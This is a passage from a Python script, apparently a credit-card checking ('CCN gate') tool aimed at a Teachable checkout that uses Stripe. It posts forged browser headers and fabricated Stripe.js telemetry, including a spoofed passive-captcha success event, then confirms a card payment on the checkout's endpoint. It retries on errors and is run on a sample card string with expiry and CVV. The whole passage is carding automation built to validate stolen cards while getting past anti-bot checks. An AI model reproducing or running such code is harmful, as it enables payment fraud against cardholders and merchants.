            headers = {
                'authority': 'r.stripe.com',
                'accept': 'application/json',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'pragma': 'no-cache',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            data = {
                'client_id': 'stripe-js',
                'num_requests': '4',
                'events': f'[{{"event_name":"elements.captcha.passive.execute","created":{created},"batching_enabled":true,"event_count":267,"os":"Windows","browserFamily":"Chrome","version":"e22c2352fa","event_id":"f66e477c-f74e-4748-831b-e34cfb0fbdee","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2022","connection_rtt":"100","connection_downlink":"10","connection_effective_type":"4g","key":"pk_live_hkgvgSBxG4TAl3zGlXiB1KUX","key_mode":"live","referrer":"https://checkout.teachable.com","betas":"enable_stripe_update_api_key_beta_0","stripe_js_id":"b4944529-2558-4ff3-939e-d750763d4810","controller_load_time":1742352090154,"stripe_js_release_train":"v3","wrapper":"react-stripe-js","wrapper_version":"2.3.1","es_module":"true","es_module_version":"2.1.10","elements_init_source":"stripe.elements","deploy_status_time_to_fetch_ms":"125","deploy_status_fetch_failed":"false","cdn_name":"Cloudfront","cdn_pop_dc":"QRO","decoupled_intent":"true","merchant":"acct_2PiGmErXUVBYpBMiYUTU","currency":"usd","default_integration":"link_default_integration_2","link_passthrough_mode_enabled":"true","frame_width":847,"elapsed_time":1655,"duration":1649,"site_key":"463b917e-e264-403f-ad34-34af0ee10294"}},{{"event_name":"elements.captcha.passive.success","created":1742354425587,"batching_enabled":true,"event_count":268,"os":"Windows","browserFamily":"Chrome","version":"e22c2352fa","event_id":"64b9b017-5180-481e-a922-19f6718dde48","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2022","connection_rtt":"100","connection_downlink":"10","connection_effective_type":"4g","key":"pk_live_hkgvgSBxG4TAl3zGlXiB1KUX","key_mode":"live","referrer":"https://checkout.teachable.com","betas":"enable_stripe_update_api_key_beta_0","stripe_js_id":"b4944529-2558-4ff3-939e-d750763d4810","controller_load_time":1742352090154,"stripe_js_release_train":"v3","wrapper":"react-stripe-js","wrapper_version":"2.3.1","es_module":"true","es_module_version":"2.1.10","elements_init_source":"stripe.elements","deploy_status_time_to_fetch_ms":"125","deploy_status_fetch_failed":"false","cdn_name":"Cloudfront","cdn_pop_dc":"QRO","decoupled_intent":"true","merchant":"acct_2PiGmErXUVBYpBMiYUTU","currency":"usd","default_integration":"link_default_integration_2","link_passthrough_mode_enabled":"true","frame_width":847,"duration":1655,"site_key":"463b917e-e264-403f-ad34-34af0ee10294"}},{{"event_name":"rum.stripejs","created":1742354426302,"batching_enabled":true,"event_count":269,"os":"Windows","browserFamily":"Chrome","version":3,"event_id":"f3bbf890-e9c4-4e22-a3cf-726dc86a21a6","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2022","connection_rtt":"100","connection_downlink":"10","connection_effective_type":"4g","key":"pk_live_hkgvgSBxG4TAl3zGlXiB1KUX","key_mode":"live","referrer":"https://checkout.teachable.com","betas":"enable_stripe_update_api_key_beta_0","stripe_js_id":"b4944529-2558-4ff3-939e-d750763d4810","controller_load_time":1742352090154,"stripe_js_release_train":"v3","wrapper":"react-stripe-js","wrapper_version":"2.3.1","es_module":"true","es_module_version":"2.1.10","elements_init_source":"stripe.elements","deploy_status_time_to_fetch_ms":"125","deploy_status_fetch_failed":"false","cdn_name":"Cloudfront","cdn_pop_dc":"QRO","decoupled_intent":"true","merchant":"acct_2PiGmErXUVBYpBMiYUTU","currency":"usd","default_integration":"link_default_integration_2","link_passthrough_mode_enabled":"true","requestId":"req_hfYu3Tm7EPXoCP","tokenType":"card","url":"https://api.stripe.com/v1/payment_methods","status":"200","start":1742354425591,"end":1742354426302,"resourceTiming[startTime]":2335843.3,"resourceTiming[duration]":709,"resourceTiming[redirectStart]":0,"resourceTiming[redirectEnd]":0,"resourceTiming[fetchStart]":2335843.3,"resourceTiming[domainLookupStart]":2335873.4,"resourceTiming[domainLookupEnd]":2335873.4,"resourceTiming[connectStart]":2335873.4,"resourceTiming[connectEnd]":2336032.3,"resourceTiming[secureConnectionStart]":2335952,"resourceTiming[requestStart]":2336032.6,"resourceTiming[responseStart]":2336551.7,"resourceTiming[responseEnd]":2336552.3,"paymentUserAgent":"stripe.js/e22c2352fa; stripe-js-v3/e22c2352fa"}},{{"event_name":"elements.create_payment_method.success","created":{created},"batching_enabled":true,"event_count":270,"os":"Windows","browserFamily":"Chrome","version":"e22c2352fa","event_id":"4065b3e0-c379-43cc-a644-f33977c50629","deploy_status":"main","browserClassification":"modern","browser_classification_v2":"2022","connection_rtt":"100","connection_downlink":"10","connection_effective_type":"4g","key":"pk_live_hkgvgSBxG4TAl3zGlXiB1KUX","key_mode":"live","referrer":"https://checkout.teachable.com","betas":"enable_stripe_update_api_key_beta_0","stripe_js_id":"b4944529-2558-4ff3-939e-d750763d4810","controller_load_time":1742352090154,"stripe_js_release_train":"v3","wrapper":"react-stripe-js","wrapper_version":"2.3.1","es_module":"true","es_module_version":"2.1.10","elements_init_source":"stripe.elements","deploy_status_time_to_fetch_ms":"125","deploy_status_fetch_failed":"false","cdn_name":"Cloudfront","cdn_pop_dc":"QRO","decoupled_intent":"true","merchant":"acct_2PiGmErXUVBYpBMiYUTU","currency":"usd","default_integration":"link_default_integration_2","link_passthrough_mode_enabled":"true","frame_width":847,"object_id":"pm_0R4DB8mErXUVBYpBx06gLyHw","object_kind":"payment_method","object_type":"card","object_livemode":"true","element":"payment","usesLink":"false","hasValidMids":"true"}}]',
            }

            response = cliente.post('https://r.stripe.com/b', headers=headers, data=data)

            headers = {
                'authority': 'sso.teachable.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'access-control-request-headers': 'content-type,correlation-id',
                'access-control-request-method': 'POST',
                'cache-control': 'no-cache',
                'origin': 'https://checkout.teachable.com',
                'pragma': 'no-cache',
                'referer': 'https://checkout.teachable.com/',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            response = cliente.options(
                f'https://sso.teachable.com/secure/829117/student_checkout/{order_token}/confirm/credit_card.json',
                headers=headers,
            )

            headers = {
                'authority': 'sso.teachable.com',
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.9',
                'cache-control': 'no-cache',
                'content-type': 'application/json',
                'correlation-id': '',
                'origin': 'https://checkout.teachable.com',
                'pragma': 'no-cache',
                'referer': 'https://checkout.teachable.com/',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
            }

            json_data = {
                'country_code': 'US',
                'stripe_payment_method_id': token,
            }

            response = cliente.post(
                f'https://sso.teachable.com/secure/829117/student_checkout/{order_token}/confirm/credit_card.json',
                headers=headers,
                json=json_data,
            )
            responsePm = json.loads(response.text)
            print(responsePm)

            

            

           
                    
            print(response)
            

        
            
        except Exception as e:
            print(e)
            retry_count += 1
    else:
        return {"card": card, "status": "ERROR", "resp":  f"Retries: {retry_count}"}
    

if __name__ == "__main__":
    print(ccn_gate("5456080017837048|02|2028|734"))